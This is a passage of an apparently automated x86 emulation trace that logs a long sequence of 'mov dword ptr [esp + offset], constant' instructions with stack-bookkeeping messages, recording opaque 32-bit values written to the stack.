size 0x10000 saving data to stack: 2840553714 4 0x403c29: mov dword ptr [esp + 0xf7c], 0x512455cf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f7c for stack size 0x10000 saving data to stack: 1361335759 4 0x403c34: mov dword ptr [esp + 0xf80], 0x7e110da7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f80 for stack size 0x10000 saving data to stack: 2115046823 4 0x403c3f: mov dword ptr [esp + 0xf84], 0xdbd31bb8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f84 for stack size 0x10000 saving data to stack: 3688045496 4 0x403c4a: mov dword ptr [esp + 0xf88], 0xc5689644, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f88 for stack size 0x10000 saving data to stack: 3311965764 4 0x403c55: mov dword ptr [esp + 0xf8c], 0x3aecbe65, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f8c for stack size 0x10000 saving data to stack: 988593765 4 0x403c60: mov dword ptr [esp + 0xf90], 0x727f37f9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f90 for stack size 0x10000 saving data to stack: 1920940025 4 0x403c6b: mov dword ptr [esp + 0xf94], 0xd02622ee, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f94 for stack size 0x10000 saving data to stack: 3492160238 4 0x403c76: mov dword ptr [esp + 0xf98], 0xe6d1de56, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f98 for stack size 0x10000 saving data to stack: 3872513622 4 0x403c81: mov dword ptr [esp + 0xf9c], 0xab15d94b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8f9c for stack size 0x10000 saving data to stack: 2870335819 4 0x403c8c: mov dword ptr [esp + 0xfa0], 0x391fbcb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fa0 for stack size 0x10000 saving data to stack: 59898827 4 0x403c97: mov dword ptr [esp + 0xfa4], 0x3a591374, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fa4 for stack size 0x10000 saving data to stack: 978916212 4 0x403ca2: mov dword ptr [esp + 0xfa8], 0x2fe20a78, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fa8 for stack size 0x10000 saving data to stack: 803342968 4 0x403cad: mov dword ptr [esp + 0xfac], 0x3e098831, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fac for stack size 0x10000 saving data to stack: 1040812081 4 0x403cb8: mov dword ptr [esp + 0xfb0], 0xb218e84d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fb0 for stack size 0x10000 saving data to stack: 2987976781 4 0x403cc3: mov dword ptr [esp + 0xfb4], 0x6836e82a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fb4 for stack size 0x10000 saving data to stack: 1748428842 4 0x403cce: mov dword ptr [esp + 0xfb8], 0x56ed8cfa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fb8 for stack size 0x10000 saving data to stack: 1458408698 4 0x403cd9: mov dword ptr [esp + 0xfbc], 0x6c2d7867, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fbc for stack size 0x10000 saving data to stack: 1814919271 4 0x403ce4: mov dword ptr [esp + 0xfc0], 0xcb4b6b8f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fc0 for stack size 0x10000 saving data to stack: 3410717583 4 0x403cef: mov dword ptr [esp + 0xfc4], 0x5627bd30, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fc4 for stack size 0x10000 saving data to stack: 1445444912 4 0x403cfa: mov dword ptr [esp + 0xfc8], 0x594d71ac, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fc8 for stack size 0x10000 saving data to stack: 1498247596 4 0x403d05: mov dword ptr [esp + 0xfcc], 0x2d8dad3d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fcc for stack size 0x10000 saving data to stack: 764259645 4 0x403d10: mov dword ptr [esp + 0xfd0], 0xfc2001, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fd0 for stack size 0x10000 saving data to stack: 16523265 4 0x403d1b: mov dword ptr [esp + 0xfd4], 0xa5be0b66, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fd4 for stack size 0x10000 saving data to stack: 2780695398 4 0x403d26: mov dword ptr [esp + 0xfd8], 0x3cc8cbe, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fd8 for stack size 0x10000 saving data to stack: 63737022 4 0x403d31: mov dword ptr [esp + 0xfdc], 0x5d9257e3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fdc for stack size 0x10000 saving data to stack: 1569871843 4 0x403d3c: mov dword ptr [esp + 0xfe0], 0x7ac59233, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fe0 for stack size 0x10000 saving data to stack: 2059768371 4 0x403d47: mov dword ptr [esp + 0xfe4], 0xf10b0bec, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fe4 for stack size 0x10000 saving data to stack: 4044033004 4 0x403d52: mov dword ptr [esp + 0xfe8], 0x98a2bac0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fe8 for stack size 0x10000 saving data to stack: 2560801472 4 0x403d5d: mov dword ptr [esp + 0xfec], 0xe8dc5da9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8fec for stack size 0x10000 saving data to stack: 3906756009 4 0x403d68: mov dword ptr [esp + 0xff0], 0xed1bd315, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ff0 for stack size 0x10000 saving data to stack: 3978023701 4 0x403d73: mov dword ptr [esp + 0xff4], 0x594b8182, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ff4 for stack size 0x10000 saving data to stack: 1498120578 4 0x403d7e: mov dword ptr [esp + 0xff8], 0x6692e482, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ff8 for stack size 0x10000 saving data to stack: 1720902786 4 0x403d89: mov dword ptr [esp + 0xffc], 0x734f4ff, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ffc for stack size 0x10000 saving data to stack: 120911103 4 0x403d94: mov dword ptr [esp + 0x1000], 0x2d0004b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9000 for stack size 0x10000 saving data to stack: 754975927 4 0x403d9f: mov dword ptr [esp + 0x1004], 0xea9a24e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9004 for stack size 0x10000 saving data to stack: 3935970536 4 0x403daa: mov dword ptr [esp + 0x1008], 0x2de34054, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9008 for stack size 0x10000 saving data to stack: 769867860 4 0x403db5: mov dword ptr [esp + 0x100c], 0x7fbb695, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x900c for stack size 0x10000 saving data to stack: 133936789 4 0x403dc0: mov dword ptr [esp + 0x1010], 0x68823d09, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9010 for stack size 0x10000 saving data to stack: 1753365769 4 0x403dcb: mov dword ptr [esp + 0x1014], 0x3a30731e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9014 for stack size 0x10000 saving data to stack: 976253726 4 0x403dd6: mov dword ptr [esp + 0x1018], 0x19719c66, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9018 for stack size 0x10000 saving data to stack: 426876006 4 0x403de1: mov dword ptr [esp + 0x101c], 0x1a9cfefb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x901c for stack size 0x10000 saving data to stack: 446496507 4 0x403dec: mov dword ptr [esp + 0x1020], 0x1a64ef5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9020 for stack size 0x10000 saving data to stack: 442822491 4 0x403df7: mov dword ptr [esp + 0x1024], 0x28214824, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9024 for stack size 0x10000 saving data to stack: 673269796 4 0x403e02: mov dword ptr [esp + 0x1028], 0x81834188, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9028 for stack size 0x10000 saving data to stack: 2172862856 4 0x403e0d: mov dword ptr [esp + 0x102c], 0xdec717e1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x902c for stack size 0x10000 saving data to stack: 3737589729 4 0x403e18: mov dword ptr [esp + 0x1030], 0x3fd631dd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9030 for stack size 0x10000 saving data to stack: 1071002077 4 0x403e23: mov dword ptr [esp + 0x1034], 0x55ff1cda, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9034 for stack size 0x10000 saving data to stack: 1442782426 4 0x403e2e: mov dword ptr [esp + 0x1038], 0xd26a290a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9038 for stack size 0x10000 saving data to stack: 3530172682 4 0x403e39: mov dword ptr [esp + 0x103c], 0xb026c697, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x903c for stack size 0x10000 saving data to stack: 2955331223 4 0x403e44: mov dword ptr [esp + 0x1040], 0xde172d1f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9040 for stack size 0x10000 saving data to stack: 3726060831 4 0x403e4f: mov dword ptr [esp + 0x1044], 0xc0320d60, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9044 for stack size 0x10000 saving data to stack: 3224505696 4 0x403e5a: mov dword ptr [esp + 0x1048], 0x8573b1bc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9048 for stack size 0x10000 saving data to stack: 2238951868 4 0x403e65: mov dword ptr [esp + 0x104c], 0xcc4918ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x904c for stack size 0x10000 saving data to stack: 3427342573 4 0x403e70: mov dword ptr [esp + 0x1050], 0x37746b91, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9050 for stack size 0x10000 saving data to stack: 930376593 4 0x403e7b: mov dword ptr [esp + 0x1054], 0xb4851496, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9054 for stack size 0x10000 saving data to stack: 3028620438 4 0x403e86: mov dword ptr [esp + 0x1058], 0x97d5504e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9058 for stack size 0x10000 saving data to stack: 2547339342 4 0x403e91: mov dword ptr [esp + 0x105c], 0x2914fa93, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x905c for stack size 0x10000 saving data to stack: 689240723 4 0x403e9c: mov dword ptr [esp + 0x1060], 0xfe4b17c3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9060 for stack size 0x10000 saving data to stack: 4266334147 4 0x403ea7: mov dword ptr [esp + 0x1064], 0x8d9bd01c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9064 for stack size 0x10000 saving data to stack: 2375798812 4 0x403eb2: mov dword ptr [esp + 0x1068], 0xb01e55d0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9068 for stack size 0x10000 saving data to stack: 2954778064 4 0x403ebd: mov dword ptr [esp + 0x106c], 0xf7a366d9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x906c for stack size 0x10000 saving data to stack: 4154681049 4 0x403ec8: mov dword ptr [esp + 0x1070], 0x639a51a5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9070 for stack size 0x10000 saving data to stack: 1671057829 4 0x403ed3: mov dword ptr [esp + 0x1074], 0xf00895b2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9074 for stack size 0x10000 saving data to stack: 4027094450 4 0x403ede: mov dword ptr [esp + 0x1078], 0xb9e23b92, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9078 for stack size 0x10000 saving data to stack: 3118611346 4 0x403ee9: mov dword ptr [esp + 0x107c], 0xc737762f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x907c for stack size 0x10000 saving data to stack: 3342300719 4 0x403ef4: mov dword ptr [esp + 0x1080], 0xd524a6c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9080 for stack size 0x10000 saving data to stack: 3575948999 4 0x403eff: mov dword ptr [esp + 0x1084], 0xc8d09218, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9084 for stack size 0x10000 saving data to stack: 3369112088 4 0x403f0a: mov dword ptr [esp + 0x1088], 0xf6913864, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9088 for stack size 0x10000 saving data to stack: 4136712292 4 0x403f15: mov dword ptr [esp + 0x108c], 0xb96aecc5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x908c for stack size 0x10000 saving data to stack: 3110792389 4 0x403f20: mov dword ptr [esp + 0x1090], 0x84529319, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9090 for stack size 0x10000 saving data to stack: 2220004121 4 0x403f2b: mov dword ptr [esp + 0x1094], 0x2fa7a0ce, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9094 for stack size 0x10000 saving data to stack: 799514830 4 0x403f36: mov dword ptr [esp + 0x1098], 0x3558d8f6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9098 for stack size 0x10000 saving data to stack: 895015158 4 0x403f41: mov dword ptr [esp + 0x109c], 0xf8d36c2b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x909c for stack size 0x10000 saving data to stack: 4174605355 4 0x403f4c: mov dword ptr [esp + 0x10a0], 0x67080c6b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90a0 for stack size 0x10000 saving data to stack: 1728580715 4 0x403f57: mov dword ptr [esp + 0x10a4], 0x83a4fcd4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90a4 for stack size 0x10000 saving data to stack: 2208627924 4 0x403f62: mov dword ptr [esp + 0x10a8], 0xf1935818, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90a8 for stack size 0x10000 saving data to stack: 4052965400 4 0x403f6d: mov dword ptr [esp + 0x10ac], 0xd3fbde11, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90ac for stack size 0x10000 saving data to stack: 3556498961 4 0x403f78: mov dword ptr [esp + 0x10b0], 0x3db4716d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90b0 for stack size 0x10000 saving data to stack: 1035235693 4 0x403f83: mov dword ptr [esp + 0x10b4], 0xacac358a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90b4 for stack size 0x10000 saving data to stack: 2896967050 4 0x403f8e: mov dword ptr [esp + 0x10b8], 0xd6a0f51a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90b8 for stack size 0x10000 saving data to stack: 3600872730 4 0x403f99: mov dword ptr [esp + 0x10bc], 0xc49aa4c7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90bc for stack size 0x10000 saving data to stack: 3298469063 4 0x403fa4: mov dword ptr [esp + 0x10c0], 0xbba4b4af, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90c0 for stack size 0x10000 saving data to stack: 3148133551 4 0x403faf: mov dword ptr [esp + 0x10c4], 0x73a36790, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90c4 for stack size 0x10000 saving data to stack: 1940088720 4 0x403fba: mov dword ptr [esp + 0x10c8], 0x9f045b4c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90c8 for stack size 0x10000 saving data to stack: 2667862860 4 0x403fc5: mov dword ptr [esp + 0x10cc], 0x22f6319d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90cc for stack size 0x10000 saving data to stack: 586559901 4 0x403fd0: mov dword ptr [esp + 0x10d0], 0x9d238a21, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90d0 for stack size 0x10000 saving data to stack: 2636352033 4 0x403fdb: mov dword ptr [esp + 0x10d4], 0xc8f8f2c6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90d4 for stack size 0x10000 saving data to stack: 3371758278 4 0x403fe6: mov dword ptr [esp + 0x10d8], 0x5793b85e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90d8 for stack size 0x10000 saving data to stack: 1469298782 4 0x403ff1: mov dword ptr [esp + 0x10dc], 0x33fe2bc3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90dc for stack size 0x10000 saving data to stack: 872295363 4 0x403ffc: mov dword ptr [esp + 0x10e0], 0xb95100d3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90e0 for stack size 0x10000 saving data to stack: 3109093587 4 0x404007: mov dword ptr [esp + 0x10e4], 0x370caecc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90e4 for stack size 0x10000 saving data to stack: 923578060 4 0x404012: mov dword ptr [esp + 0x10e8], 0x1aa21960, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90e8 for stack size 0x10000 saving data to stack: 446830944 4 0x40401d: mov dword ptr [esp + 0x10ec], 0x6d4d3009, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90ec for stack size 0x10000 saving data to stack: 1833775113 4 0x404028: mov dword ptr [esp + 0x10f0], 0x7612a1b5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90f0 for stack size 0x10000 saving data to stack: 1980932533 4 0x404033: mov dword ptr [esp + 0x10f4], 0x9f4d2462, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90f4 for stack size 0x10000 saving data to stack: 2672632930 4 0x40403e: mov dword ptr [esp + 0x10f8], 0xf96e0822, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90f8 for stack size 0x10000 saving data to stack: 4184737826 4 0x404049: mov dword ptr [esp + 0x10fc], 0xd220a75f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x90fc for stack size 0x10000 saving data to stack: 3525355359 4 0x404054: mov dword ptr [esp + 0x1100], 0x25f5a557, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9100 for stack size 0x10000 saving data to stack: 636855639 4 0x40405f: mov dword ptr [esp + 0x1104], 0xbe055848, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9104 for stack size 0x10000 saving data to stack: 3188021320 4 0x40406a: mov dword ptr [esp + 0x1108], 0xf26e2474, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9108 for stack size 0x10000 saving data to stack: 4067304564 4 0x404075: mov dword ptr [esp + 0x110c], 0x7e217ef5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x910c for stack size 0x10000 saving data to stack: 2116124405 4 0x404080: mov dword ptr [esp + 0x1110], 0x289a7029, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9110 for stack size 0x10000 saving data to stack: 681209897 4 0x40408b: mov dword ptr [esp + 0x1114], 0x135ae37e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9114 for stack size 0x10000 saving data to stack: 324723582 4 0x404096: mov dword ptr [esp + 0x1118], 0x65899286, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9118 for stack size 0x10000 saving data to stack: 1703514758 4 0x4040a1: mov dword ptr [esp + 0x111c], 0x4b0edb5b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x911c for stack size 0x10000 saving data to stack: 1259264859 4 0x4040ac: mov dword ptr [esp + 0x1120], 0xdd5cf77b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9120 for stack size 0x10000 saving data to stack: 3713857403 4 0x4040b7: mov dword ptr [esp + 0x1124], 0xda521584, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9124 for stack size 0x10000 saving data to stack: 3662812548 4 0x4040c2: mov dword ptr [esp + 0x1128], 0xfd020ba8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9128 for stack size 0x10000 saving data to stack: 4244769704 4 0x4040cd: mov dword ptr [esp + 0x112c], 0x98b27041, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x912c for stack size 0x10000 saving data to stack: 2561830977 4 0x4040d8: mov dword ptr [esp + 0x1130], 0xf3845dfd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9130 for stack size 0x10000 saving data to stack: 4085538301 4 0x4040e3: mov dword ptr [esp + 0x1134], 0x3594e3a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9134 for stack size 0x10000 saving data to stack: 56184378 4 0x4040ee: mov dword ptr [esp + 0x1138], 0xe208fdaa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9138 for stack size 0x10000 saving data to stack: 3792240042 4 0x4040f9: mov dword ptr [esp + 0x113c], 0x1693ac77, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x913c for stack size 0x10000 saving data to stack: 378776695 4 0x404104: mov dword ptr [esp + 0x1140], 0xaeb119bf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9140 for stack size 0x10000 saving data to stack: 2930842047 4 0x40410f: mov dword ptr [esp + 0x1144], 0x5756aa40, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9144 for stack size 0x10000 saving data to stack: 1465297472 4 0x40411a: mov dword ptr [esp + 0x1148], 0x371ce2dc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9148 for stack size 0x10000 saving data to stack: 924639964 4 0x404125: mov dword ptr [esp + 0x114c], 0x2b8f44d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x914c for stack size 0x10000 saving data to stack: 45675597 4 0x404130: mov dword ptr [esp + 0x1150], 0x61aad731, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9150 for stack size 0x10000 saving data to stack: 1638586161 4 0x40413b: mov dword ptr [esp + 0x1154], 0xbe2db8f6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9154 for stack size 0x10000 saving data to stack: 3190667510 4 0x404146: mov dword ptr [esp + 0x1158], 0x7bd36dee, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9158 for stack size 0x10000 saving data to stack: 2077453806 4 0x404151: mov dword ptr [esp + 0x115c], 0xf400acf3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x915c for stack size 0x10000 saving data to stack: 4093684979 4 0x40415c: mov dword ptr [esp + 0x1160], 0x7bd76863, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9160 for stack size 0x10000 saving data to stack: 2077714531 4 0x404167: mov dword ptr [esp + 0x1164], 0x72075d7c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9164 for stack size 0x10000 saving data to stack: 1913085308 4 0x404172: mov dword ptr [esp + 0x1168], 0xb5fb070, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9168 for stack size 0x10000 saving data to stack: 190820464 4 0x40417d: mov dword ptr [esp + 0x116c], 0xffbfb5b9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x916c for stack size 0x10000 saving data to stack: 4290753977 4 0x404188: mov dword ptr [esp + 0x1170], 0xcf512d45, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9170 for stack size 0x10000 saving data to stack: 3478203717 4 0x404193: mov dword ptr [esp + 0x1174], 0x14f6ed92, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9174 for stack size 0x10000 saving data to stack: 351726994 4 0x40419e: mov dword ptr [esp + 0x1178], 0x681e9732, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9178 for stack size 0x10000 saving data to stack: 1746835250 4 0x4041a9: mov dword ptr [esp + 0x117c], 0x47ca708f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x917c for stack size 0x10000 saving data to stack: 1204449423 4 0x4041b4: mov dword ptr [esp + 0x1180], 0x3ce03be7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9180 for stack size 0x10000 saving data to stack: 1021328359 4 0x4041bf: mov dword ptr [esp + 0x1184], 0xd2793678, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9184 for stack size 0x10000 saving data to stack: 3531159160 4 0x4041ca: mov dword ptr [esp + 0x1188], 0x8437c484, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9188 for stack size 0x10000 saving data to stack: 2218247300 4 0x4041d5: mov dword ptr [esp + 0x118c], 0x3192d925, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x918c for stack size 0x10000 saving data to stack: 831707429 4 0x4041e0: mov dword ptr [esp + 0x1190], 0x314e6639, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9190 for stack size 0x10000 saving data to stack: 827221561 4 0x4041eb: mov dword ptr [esp + 0x1194], 0xc6cc3dae, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9194 for stack size 0x10000 saving data to stack: 3335273902 4 0x4041f6: mov dword ptr [esp + 0x1198], 0xa5a10c96, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x9198 for stack size 0x10000 saving data to stack: 2778795158 4 0x404201: mov dword ptr [esp + 0x119c], 0xa1bbf40b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x919c for stack size 0x10000 saving data to stack: 2713449483 4 0x40420c: mov dword ptr [esp + 0x11a0], 0xc2612a0b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91a0 for stack size 0x10000 saving data to stack: 3261147659 4 0x404217: mov dword ptr [esp + 0x11a4], 0x30ff2e34, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91a4 for stack size 0x10000 saving data to stack: 822029876 4 0x404222: mov dword ptr [esp + 0x11a8], 0xeeb138b8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91a8 for stack size 0x10000 saving data to stack: 4004591800 4 0x40422d: mov dword ptr [esp + 0x11ac], 0x34afa2f1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91ac for stack size 0x10000 saving data to stack: 883925745 4 0x404238: mov dword ptr [esp + 0x11b0], 0x70e8168d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91b0 for stack size 0x10000 saving data to stack: 1894258317 4 0x404243: mov dword ptr [esp + 0x11b4], 0x5edd02ea, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91b4 for stack size 0x10000 saving data to stack: 1591542506 4 0x40424e: mov dword ptr [esp + 0x11b8], 0x15bcbb3a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91b8 for stack size 0x10000 saving data to stack: 364690234 4 0x404259: mov dword ptr [esp + 0x11bc], 0x62d39327, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91bc for stack size 0x10000 saving data to stack: 1658032935 4 0x404264: mov dword ptr [esp + 0x11c0], 0x8a1a99cf, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91c0 for stack size 0x10000 saving data to stack: 2316999119 4 0x40426f: mov dword ptr [esp + 0x11c4], 0x4ccdd7f0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91c4 for stack size 0x10000 saving data to stack: 1288558576 4 0x40427a: mov dword ptr [esp + 0x11c8], 0x181c9fec, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91c8 for stack size 0x10000 saving data to stack: 404529132 4 0x404285: mov dword ptr [esp + 0x11cc], 0x2433c7fd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91cc for stack size 0x10000 saving data to stack: 607373309 4 0x404290: mov dword ptr [esp + 0x11d0], 0xbfcb4e41, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91d0 for stack size 0x10000 saving data to stack: 3217772097 4 0x40429b: mov dword ptr [esp + 0x11d4], 0x9c642626, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91d4 for stack size 0x10000 saving data to stack: 2623809062 4 0x4042a6: mov dword ptr [esp + 0x11d8], 0xc29bbafe, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91d8 for stack size 0x10000 saving data to stack: 3264985854 4 0x4042b1: mov dword ptr [esp + 0x11dc], 0x543872a3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91dc for stack size 0x10000 saving data to stack: 1412985507 4 0x4042bc: mov dword ptr [esp + 0x11e0], 0x3994c073, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91e0 for stack size 0x10000 saving data to stack: 966049907 4 0x4042c7: mov dword ptr [esp + 0x11e4], 0xe7b126ac, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91e4 for stack size 0x10000 saving data to stack: 3887146668 4 0x4042d2: mov dword ptr [esp + 0x11e8], 0x5771e900, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x91e8 